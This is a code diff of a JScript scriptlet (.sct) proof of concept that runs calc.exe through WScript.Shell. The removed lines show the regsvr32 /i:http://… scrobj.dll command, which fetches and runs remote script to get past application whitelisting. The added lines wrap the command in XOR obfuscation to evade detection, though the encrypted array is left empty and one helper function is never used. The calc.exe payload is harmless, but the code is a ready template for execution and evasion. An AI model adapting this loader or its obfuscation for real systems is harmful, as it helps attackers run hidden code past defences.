@@ -2,22 +2,33 @@
 <scriptlet>
 <registration 
     progid="PoC"
-    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
-	<!-- regsvr32 /s /u /i:http://example.com/file.sct scrobj.dll -->
-
-	<!-- Additional comments and obfuscation techniques applied here for educational purposes -->
+    classid="{F0001111-0000-0000-0000-0000FEEDACDC}">
 	<script language="JScript">
 		<![CDATA[
-			// This array holds the char codes for "calc.exe"
-			var charCodes = [99, 97, 108, 99, 46, 101, 120, 101];
-			// Convert char codes back to string
-			var cmd = "";
-			for(var i = 0; i < charCodes.length; i++) {
-				cmd += String.fromCharCode(charCodes[i]);
+			// Ofuscated decryption function that seems benign
+			function pseudoRandomGenerator(seed) {
+				var pseudoRandom = (seed * 0x343FD + 0x269EC3) & 0xFFFFFFFF;
+				return (pseudoRandom >> 16) & 0x7FFF;
 			}
-			// Execute the command
-			var r = new ActiveXObject("WScript.Shell").Run(cmd);	
+			
+			// Split and obfuscated key
+			var keyPart1 = 0x25;
+			var keyPart2 = 0x30;
+			var xorKey = keyPart1 + keyPart2;
+			
+			// Encrypted command using the XOR cipher (this needs to be pre-calculated based on the chosen key)
+			var encryptedCmd = [/* Encrypted "calc.exe" char codes */];
+			
+			// Decrypt the command
+			var cmd = "";
+			for (var i = 0; i < encryptedCmd.length; i++) {
+				cmd += String.fromCharCode(encryptedCmd[i] ^ xorKey);
+			}
+			
+			// Execute the decrypted command
+			var shell = new ActiveXObject("WScript.Shell");
+			var execResult = shell.Run(cmd);
 		]]>
-</script>
+	</script>
 </registration>
 </scriptlet>
